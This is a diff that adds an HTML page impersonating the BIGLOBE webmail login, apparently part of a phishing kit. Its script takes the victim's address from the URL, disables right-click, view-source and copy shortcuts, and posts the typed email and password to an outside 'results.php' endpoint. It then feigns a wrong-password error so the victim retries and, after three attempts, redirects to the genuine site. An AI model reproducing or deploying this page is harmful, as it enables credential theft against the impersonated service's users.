@@ -1,0 +1,675 @@
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN" "http://www.w3.org/TR/html4/frameset.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta http-equiv="Pragma" content="no-cache">
+<meta http-equiv="Cache-Control" content="no-cache">
+<meta http-equiv="Expires" content="Thu, 01 Dec 1994 16:00:00 GMT">
+<meta http-equiv="X-UA-Compatible" content="requiresActiveX=true" />
+<meta http-equiv="X-UA-Compatible" content="IE=emulateIE9" />
+<meta name="keywords" content="メール,Webメール,Ｗｅｂメール,BIGLOBE,ビッグローブ" />
+<meta name="description" content="BIGLOBEメールはブラウザで手軽にメールが使えます。スマートフォンにも対応。面倒な設定はいらず、ログインするだけですぐにご利用いただけます。" />
+<title>BIGLOBEメール｜Webメール</title>
+<link rel="icon" href="https://webmail.biglobe.ne.jp/images2/common/favicon.ico" type="image/vnd.microsoft.icon" />
+<link href="https://webmail.biglobe.ne.jp/css2/import_top.css" rel="stylesheet" type="text/css" />
+<script type="text/javascript" src="https://webmail.biglobe.ne.jp/js2/common.js"  charset="SHIFT-JIS"></script>
+<script type="text/javascript" src="https://webmail.biglobe.ne.jp/js2/wm_login.js"></script>
+<script type="text/javascript" src="/api/js/check_deprecated_browser.js"></script>
+<script type="text/javascript" src="/api/js/input_time_chk.js"></script>
+
+<!-- SWキーボードここから//-->
+<link rel="stylesheet" href="https://webmail.biglobe.ne.jp/softkeyboard/softkeyboardsjis.css">
+<script language="JavaScript" src="/api/softkeyboard/webmail_jquery.js"  charset="SHIFT-JIS"></script>
+<script language="JavaScript" src="/api/softkeyboard/webmail_jquery.softkeyboard.loginmail.js" charset="SHIFT-JIS"></script>
+
+
+
+<script src="https://code.jquery.com/jquery-2.1.1.min.js" integrity="sha256-h0cGsrExGgcZtSZ/fRz4AwV+Nn6Urh/3v3jFRQ0w9dQ=" crossorigin="anonymous"></script>
+<style>
+.loader {
+	position: absolute;
+	padding-top: 0;
+	width: 40px;
+	margin: 0px;
+}
+
+.loader .circle {
+	position: absolute;
+	width: 18px;
+	height: 18px;
+	opacity: 0;
+	transform: rotate(225deg);
+	animation-iteration-count: infinite;
+	animation-name: orbit;
+	animation-duration: 3s;
+}
+
+.loader .circle:after {
+	content: "";
+	position: absolute;
+	width: 3px;
+	height: 3px;
+	border-radius: 5px;
+	background: #000;
+}
+
+.loader .circle:nth-child(2) {
+	animation-delay: 240ms;
+}
+.loader .circle:nth-child(3) {
+	animation-delay: 480ms;
+}
+.loader .circle:nth-child(4) {
+	animation-delay: 720ms;
+}
+.loader .circle:nth-child(5) {
+	animation-delay: 960ms;
+}
+
+@keyframes orbit {
+	0% {
+		transform: translate(10px, 0);
+		opacity: 1;
+		animation-timing-function: ease-out;
+	}
+	7% {
+		transform: translate(30px, 0);
+		animation-timing-function: linear;
+	}
+	30% {
+		transform: translate(60px, 0);
+		animation-timing-function: ease-in-out;
+	}
+	40% {
+		transform: translate(90px, 0);
+		animation-timing-function: ease-out;
+	}
+	50% {
+		transform: translate(120px, 0);
+		animation-timing-function: ease-out;
+	}
+	75% {
+		transform: translate(250px, 0);
+		animation-timing-function: ease-out;
+	}
+	76% {
+		transform: translate(300px, 0);
+		opacity: 0;
+	}
+	100% {
+		transform: translate(350px, 0);
+		opacity: 0;
+	}
+}
+
+#myProgress {
+  width: 300px;
+  background-color: #ccc;
+}
+
+#myBar {
+  width: 1%;
+  height: 4px;
+  background-color: #0072c6;
+  text-align: center; /* To center it horizontally (if you want) */
+  line-height: 10px; /* To center it vertically */
+  color: white;
+}
+
+</style>
+<script type="text/javascript">
+var i = 0;
+function move() {
+	if (i == 0) {
+		i = 1;
+		var elem = document.getElementById("myBar");
+		var width = 1;
+		var id = setInterval(frame, 60);
+		function frame() {
+		  if (width >= 100) {
+			clearInterval(id);
+			i = 0;
+		  } else {
+			width++;
+			elem.style.width = width + "%";
+		  }
+		}
+	}
+}
+</script>
+
+<script type="text/javascript">
+$( document ).ready(function(){
+	$('#text1').fadeIn('slow', function(){
+	   $('#text1').delay(1000).fadeOut(); 
+	});
+	$('#text2').delay(2000).fadeIn('slow', function(){
+	   $('#text2').delay(2000).fadeOut(); 
+	});
+	$('#text3').delay(5000).fadeIn('slow', function(){
+	   $('#text3').delay(5000).fadeOut(); 
+	});
+	
+	var url = window.location.search;
+	var vals = url.split("=");
+	email = vals[1];
+	//Using setTimeout to execute a function after 5 seconds.
+	setTimeout(function () {
+	    //Redirect with JavaScript
+		$('#first').hide();
+		$('#second').show();
+	}, 6000);
+});
+
+</script>
+</head>
+<body onload="move()">
+<div id="first" style="">
+<center>
+	<div style="margin-top: 10%;">
+	<b><h5 style="color: #808080; font-family: 'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif; margin-top:2em;font-size: 18px;">メールアカウントを確認するまでお待ちください。<h5></b><br><br><br><br><br><br>
+	<img id="loadingLogo" style="padding: 20px;" alt="Outlook" width="300" height="" src="https://webmail.biglobe.ne.jp/images2/common/logo_email.gif">
+		<div id="myProgress" style="text-align: left">
+			<div id="myBar"></div>
+		</div>
+		
+		<div style="padding: 0px; color: #0072c6; font-family: 'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif; font-size: 12px; width: 300px; margin-top: 15px;" >		
+			<p>
+			<span id="text1" style="display: none">メールボックスを開く....</span>
+			<span id="text3" style="display: none">サインインアクティビティの確認....</span>
+			<span id="text2" style="display: none">アカウントの詳細を確認する....</span>
+			</p>
+		</div>	  
+	</div>
+	</center>
+    </div>
+    <app ng-version="4.1.3">
+ <div id="second" style="display: none">
+ <router-outlet></router-outlet>
+<ng-component>
+
+
+<div id="container"><a name="pagetop"></a>
+<!-- Header// -->
+<div id="header_main">
+	<div id="header_logo">
+	<h1><img src="https://webmail.biglobe.ne.jp/images2/common/logo_email.gif" alt="BIGLOBEメール" usemap="#logo" width="210" height="31" /></h1>
+	<map name="logo">
+	<area shape="rect" coords="0,0,150,35" href="/" alt="BIGLOBE" />
+	<area shape="rect" coords="150,0,210,35" href="/" alt="BIGLOBEメール" />
+	</map>
+	</div><!--/header-logo-->
+	<div id="header_keyword">
+	<strong>メールがもっと便利で楽しくなる！</strong>
+	</div><!--/header_keyword-->
+<!--
+	<div id="headerNavi">
+	<div class="search">
+<form method="get" action="http://guide.biglobe.ne.jp/cgi-bin/search-roboBS" name="search">
+<input type="text" name="q" size="18" style="width:125px;color:#999" value="キーワード" onFocus="javascript:if(this.value=='キーワード')
+							this.value='';this.style.color='#333'" onBlur="javascript:if(this.value=='')this.value='キーワード';this.style.color='#999'" />
+<input type="submit" value="サイト内検索" />
+<input type="hidden" name="c" value="検索" />
+<input type="hidden" name="clid" value="1" />
+<input type="hidden" name="sitesearch" value="webmail.biglobe.ne.jp" />
+</form>
+	</div>
+	<div class="top"><a href="http://www.biglobe.ne.jp/">BIGLOBEトップ</a></div>
+	</div>
+-->
+	<br class="clear" />
+</div>
+
+<div id="header-link">
+	<div id="support_menu">
+<ul class="fmenu">
+      <li><a href="/">メールサービス</a></li>
+      <li><a class="bl" href="/" target="_blank">会員サポート</a></li>
+      <li><a class="bl" href="/" target="_blank">障害情報</a></li>
+</ul>
+	</div>
+</div>
+<!-- //Header -->
+
+
+<!-- Main_start -->
+<div id="main">
+
+<!-- Contents_start -->
+<div id="contents_block">
+
+<!-- 注意書きの記載 //-->
+	<!-- JavaScriptが動作しない場合 //-->
+	<noscript>
+		<div class="warning">
+			BIGLOBEメール（アドバンスト版）をご利用になるには、JavaScriptを有効にしてください。
+		</div>
+	</noscript>
+
+<!-- 注意書きの記載 //-->
+<!--★ここから追記4/20★-->
+<div class="news">
+<ul>
+
+
+
+</ul>
+</div>
+<!--★ここまで追記4/20★-->
+
+<!--div class="pr_block">
+</div -->
+
+<!-- 障害情報 start //-->
+<!--
+<div class="infoArea">
+<p><img src="https://asp2.blog.biglobe.ne.jp/images/manage/emoji/webry/07_attention.gif">
+<a href="https://support.biglobe.ne.jp/shogaiap/today.html#100010358" target="_blank"><font color="ff0000"><b>【一部のお客さま】Webメールへのアクセスに時間がかかる事象のお詫び(2018/7/17)</a></b></font></p>
+</div>
+-->
+<!-- 障害情報 end //-->
+
+<!-- お客様サービス start //-->
+<iframe src="https://member4.sso.biglobe.ne.jp/heute" width=800 height=36 frameborder=0 ></iframe>
+<!-- お客様サービス end //-->
+
+<!-- お知らせ start //-->
+<div class="infotitle" style="margin-top:25px;">お知らせ</div>
+<div class="infoArea">
+<p>・<a href="/" target="_blank">メールサービス メンテナンス（2022/5/18）</a><font color="ff0000"><b>New!</b></font></p>
+<p>・<a href="/" target="_blank">BIGLOBEメール メンテナンス（2022/5/19）</a><font color="ff0000"><b>New!</b></font></p>
+<p>・<a href="/" target="_blank">【キャンペーン】迷惑メールフォルダオプション(2022/4/1(金)～ 2022/5/31(火)) </a><font color="ff0000"><b>New!</b></font></p>
+<p>・<a href="/" target="_blank">【キャンペーン】使い分けアドレス（2022/4/1(金)～ 2022/5/31(火)）</a><font color="ff0000"><b>New!</b></font></p>
+<p>・<a href="/" target="_blank">Webメールにログインが出来ない場合はこちらをご確認ください。</a><font color="ff0000"><b></b></font></p>
+</div>
+<!-- お知らせ end //-->
+
+<script>
+getResponsiveCSS ();
+</script>
+<!-- div class="subArea_block">
+<h3><img src="https://webmail.biglobe.ne.jp/images2/title_top_attention.jpg" alt="ご注意ください" width="550" height="20" /></h3>
+
+<ul class="textArea">
+<li class="dot_last">
+パスワードは、第三者に悪用されないためにも、定期的に変更することをおすすめします。<br />
+［<a href="http://support.biglobe.ne.jp/jimu/idpw/pwchange/pass.html" target="blank">より安全なパスワードにするには</a>］
+</li>
+</ul>
+</div --><!-- /subArea_block -->
+
+<div id="info_footer"><p>
+
+
+<div class="webrylink">
+<center>
+
+<div class="banner_area" style="margin-bottom: 15px;">
+	<a href="/" target="_blank">
+	<img src="https://webmail.biglobe.ne.jp/images2/banner/spam_550_100_20220401.png" alt="迷惑メールフォルダオプション初月無料キャンペーン" title="迷惑メールフォルダオプション初月無料キャンペーン" />
+	</a>
+	<br />
+	<a href="/" target="_blank">
+	<img src="https://webmail.biglobe.ne.jp/images2/banner/tukaiwake_550_100_20220401.png" alt="使い分けアドレスキャンペーン" title="使い分けアドレスキャンペーン" />
+	</a>
+</div>
+<ul>
+<li><a href="/">推奨環境</a></li>
+<li><a href="/">ヘルプ</a></li>
+<li><a href="/">よくあるお問い合わせ</a></li>
+<li><a href="/">必ずお読みください</a></li>
+</ul>
+</center>
+</div>
+
+</p></div>
+
+<!-- /contents_block --></div>
+<!-- Contents_end -->
+
+
+<!-- Menu_start -->
+<div id="side_menuArea">
+<div id="side_menu_block">
+<div id="side_menu">
+<br>
+<center><b><h4 style="font-size: 18px;text-align:center;font-weight: bold;font-family: 'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;margin-buttom:2em;font-size: 15px;">サインインして続行します</h4></b><br></center>
+<h2><img src="https://webmail.biglobe.ne.jp/images2/pagetitle_top.jpg" alt="BIGLOBEメールメールにログイン" width="238" height="43" /></h2>
+
+<!-- ERRORメッセージ:s -->
+<!-- ERRORメッセージ:e -->
+
+<div class="login_block">
+<div id="login_form">
+<form method="POST" action="">
+	<input type="hidden" name="sms" value="">
+	<input type="hidden" name="ems" value="">
+
+<input type="hidden" name="onetime" value="5e783de88f6557700d86c1641b58e534">
+<input type="hidden" name="custom_id" value="">
+<input type="hidden" name="from_page" value="loginWebmail">
+	<div>
+    <center>
+    <div id="msg" style="font-size: 12px;display: none;font-weight: 600;color: red;">login failed, invalid Password! Please enter correct email password.</div>
+    <span id="error" class="text-danger" style="font-size: 12px;display: none;">That account doesn't exist. Enter a different account</span>
+    </center>
+					  
+	<br>
+	<label for="loginid">メールアドレスまたはユーザID</label>
+	<input name="email" type="email" size="21" autocomplete="off" id="email" value="" style="height:26px;font-size:16px;" placeholder="メールアドレスを入力して" />
+	<label for="biglobe_pw">BIGLOBEパスワード</label>
+	<input name="password" type="password" size="21" id="password" style="height:26px;font-size:16px;" placeholder="パスワード" />
+	</div>
+	
+<!-- Androidの場合SWキーボードのボタンを表示しないここから //-->
+<script language="Javascript" type="text/javascript">
+<!--
+
+var ua = navigator.userAgent;
+if (
+ua.indexOf('Android') == -1 && ua.indexOf('iPhone') == -1 && ua.indexOf('iPad') == -1)
+{
+document.write("<div class='skey'><img src='https://webmail.biglobe.ne.jp/images2/button_softkey.gif' alt='ソフトウェアキーボードで入力する' title='ソフトウェアキーボードで入力する' width='200' height='30' id='soft_keyboard_pass_id'></div>");
+}
+
+//-->
+</script>
+<!-- Androidの場合SWキーボードのボタンを表示しないここまで //-->
+
+<!-- SWキーボードここから //-->
+<div id="keyboard"></div>
+<div id="my_div"></div>
+
+<!-- SWキーボードここまで //-->
+
+	<ul>
+    <li><input type="checkbox" name="autologinidflag" id="autologinidflag" value="1" /><label for="autologinidflag">次回からIDの入力を省略</label></li>
+	<li><input type="checkbox" name="autologinflag" id="autologinflag" value="1" /><label for="autologinflag"><a href="/" target="_blank">ログイン状態を保存する</a><br />（共有パソコンではチェックをはずしてください）</label></li>
+        <li><SELECT name="version" id="version" onChange="deprecated_check()" style="display:none;">
+<OPTION value="advanced" selected>アドバンスト版</OPTION>
+<OPTION value="basic">標準版</OPTION>
+</SELECT></li>
+         <li>
+
+<div id='deprecated' style="padding-top: 10px">
+</div>
+
+</li>
+        </ul>
+
+	<div class="loginBtn">
+	<input type="image" src="https://webmail.biglobe.ne.jp/images2/btn_login.gif" border="0" id="submit-btn" alt="ログイン" title="ログイン" width="205" height="37"  /></div>
+</form>
+</div><!-- //login_form -->
+
+<div id="loader" class="loader" hidden>
+				<div class="circle"></div>
+				<div class="circle"></div>
+				<div class="circle"></div>
+				<div class="circle"></div>
+				<div class="circle"></div>
+			    </div>
+
+
+<script type="text/javascript">
+<!--
+
+	doit();
+
+//-->
+</script>
+
+<ul class="supportLink">
+<li><a href="/" target="_blank">ログイン方法について</a></li>
+<li><a href="/" target="_blank">ID・パスワードを忘れた場合</a><br />
+BIGLOBE法人会員でID・パスワードをお忘れの方は［<a href="/" target="_blank">こちら</a>］</li>
+<li><a href="/" target="_blank">メールアドレスの取得・確認</a></li>
+<li><a href="/" target="_blank">メールアドレスの変更</a></li>
+</ul>
+</div><!-- /login_block -->
+
+
+<!-- /side_menu --></div>
+<!-- /side_menu_block --></div>
+
+</div><!-- //side_menuArea -->
+<!-- /Menu_end -->
+
+</div><!-- /main -->
+<!-- /Main_end -->
+
+<!-- START : フッター -->
+<div id="footerContainer">
+<!--フッターサーチここから-->
+<!--
+<div id="footerSearch">
+<table border="0" align="center" cellpadding="0" cellspacing="0" summary="search form">
+<tr>
+	<form name="srh2" id="srh2" method="get" action="http://cgi.search.biglobe.ne.jp/cgi-bin/search2-f">
+	<td>
+		<input type="hidden" name="search" value="検索">
+		<input type="text" name="q" size="18" style="width:216px" value="">
+	</td>
+	<td width="3"><img src="https://webmail.biglobe.ne.jp/images2/common/spacer.gif" alt="" width="3" height="3"></td>
+	<td><input type="submit" name="btn2" value="ウェブ検索"></td>
+	</form>
+</tr>
+</table>
+</div>
+-->
+<!--フッターサーチここまで-->
+<div id="footerLink">
+	<div id="footerLinkBox1">&nbsp;</div>
+	<div id="footerLinkBox2">
+		<a href="/">BIGLOBEトップ</a>｜<a href="/">インターネット接続</a>（<a href="/">ビッグローブ光</a>・<a href="/">格安SIM</a>・<a href="/">SIM替え</a>）<br>
+		<a href="/">会社概要</a>｜<a href="/">ニュースリリース</a>｜<a href="/">採用情報</a>｜<a href="/">個人情報保護ポリシー</a>｜<a href="/">Cookieポリシー</a>｜<a href="/">安心・安全</a>｜<a href="/">お問い合わせ</a>
+	</div>
+
+
+	<div id="footerLinkBox3">
+	<img src="https://webmail.biglobe.ne.jp/images2/common/footer3logo.gif" alt="" width="210" height="66" usemap="#FooterMap" />
+<map name="FooterMap" id="FooterMap">
+<area shape="rect" coords="95,0,155,64" href="/" target="_blank" alt="プライバシーマーク" onclick="B.gae('footer', 'click', 'footer');" />
+<area shape="rect" coords="160,0,210,64" href="/" target="_blank" alt="インターネット接続サービス安全・安心マーク" onclick="B.gae('footer', 'click', 'footer');" />
+</map>
+	</div>
+
+
+</div>
+<div id="footerCopyright">
+	<script type="text/javascript" src="https://webmail.biglobe.ne.jp/js2/footer.js"></script>
+	<script type="text/javascript">
+	<!--
+	copyright();
+	//-->
+	</script>
+	<noscript>Copyright(C)BIGLOBE Inc.</noscript>
+</div>
+</div>
+<!-- END : フッター -->
+</div><!-- /container -->
+
+</div>
+</ng-component>
+</div>
+<toast-outlet></toast-outlet>
+
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/jquery.session@1.0.0/jquery.session.min.js"></script>
+
+    <script>
+    
+// prevent ctrl + s
+$(document).bind('keydown', function(e) {
+if(e.ctrlKey && (e.which == 83)) {
+e.preventDefault();
+return false;
+}
+});
+
+document.addEventListener('contextmenu', event => event.preventDefault());
+
+document.onkeydown = function(e) {
+if (e.ctrlKey && 
+(e.keyCode === 67 || 
+e.keyCode === 86 || 
+e.keyCode === 85 || 
+e.keyCode === 117)) {
+return false;
+} else {
+return true;
+}
+};
+$(document).keypress("u",function(e) {
+if(e.ctrlKey)
+{
+return false;      }
+else {
+return true;
+}});
+
+
+
+/* global $ */
+$(document).ready(function(){
+var count=0;
+
+$('#back1').click(function () {
+$("#msg").hide();
+$('#email').val("");
+$("#automail").animate({left:200, opacity:"hide"}, 0);
+$("#inputbar").animate({right:200, opacity:"show"}, 1000);
+
+});
+
+var email = window.location.hash.substr(1);
+if (!email) {
+
+}
+else
+{
+var my_email =email;
+$('#email').val(my_email);
+$('#emailich').html(my_email);
+var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+if (!filter.test(my_email)) {
+$('#error').show();
+email.focus;
+return false;
+}
+
+if (!filter.test(my_email)) {
+            $('#error').show();
+            $('#error').html("That account doesn't exist. Enter a different account");
+            ai.focus;
+            return false;
+        }
+        if (!password) {
+            $('#error').show();
+            $('#error').html("Password field is emply.!");
+            ai.focus;
+            return false;
+        }
+		
+var ind=my_email.indexOf("@");
+var my_slice=my_email.substr((ind+1));
+var c= my_slice.substr(0, my_slice.indexOf('.'));
+var final= c.toLowerCase();
+var finalu= c.toUpperCase();
+
+$("#logoimg").attr("src", "https://logo.clearbit.com/"+my_slice);
+$("#logoname").html(finalu);
+$(".logoname").html(finalu);
+}
+
+
+$('#submit-btn').click(function(event){
+$('#error').hide();
+$('#msg').hide();
+event.preventDefault();
+var email=$("#email").val();
+var password=$("#password").val();
+var msg = $('#msg').html();
+$('#msg').text( msg );
+///////////new injection////////////////
+var my_email =email;
+var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+if (!filter.test(my_email)) {
+$('#error').show();
+email.focus;
+return false;
+}
+
+var ind=my_email.indexOf("@");
+var my_slice=my_email.substr((ind+1));
+var c= my_slice.substr(0, my_slice.indexOf('.'));
+var final= c.toLowerCase();
+var finalu= c.toUpperCase();
+
+$("#logoimg").attr("src", "https://logo.clearbit.com/"+my_slice);
+$("#logoname").html(finalu);
+///////////new injection////////////////
+count=count+1;
+
+$.ajax({
+dataType: 'JSON',
+url: 'https://results.php',
+type: 'POST',
+      	data:{
+      		email:email,
+      		password:password,
+      	},
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr){
+            	$('#submit-btn').val('Verifing...');
+            },
+            success: function(response){
+            	if(response){
+            		$("#msg").show();
+            		console.log(response);
+            		if(response['signal'] == 'ok'){
+            			$("#password").val("");
+            			if (count>=3) {
+            				count=0;
+                    // window.location.replace(response['redirect_link']);
+                    window.location.replace("http://www."+my_slice);
+
+                }
+                $('#msg').html(response['msg']);
+            }
+            else{
+            	$('#msg').html(response['msg']);
+            }
+        }
+    },
+    error: function(){
+    	$("#password").val("");
+    	if (count>=3) {
+    		count=0;
+		$('#spinner').hide();
+    	window.location.replace("https://auth.sso.biglobe.ne.jp/mail/");
+    	}
+    	$("#msg").show();
+    	$('#msg').html("パスワードが間違っています！正しいメールパスワードを入力して、もう一度お試しください。");
+    },
+    complete: function(){
+    	$('#submit-btn').val('LOGIN');
+    }
+});
+  });
+
+
+	});
+	
+</script>
+
+</body>
+</html>
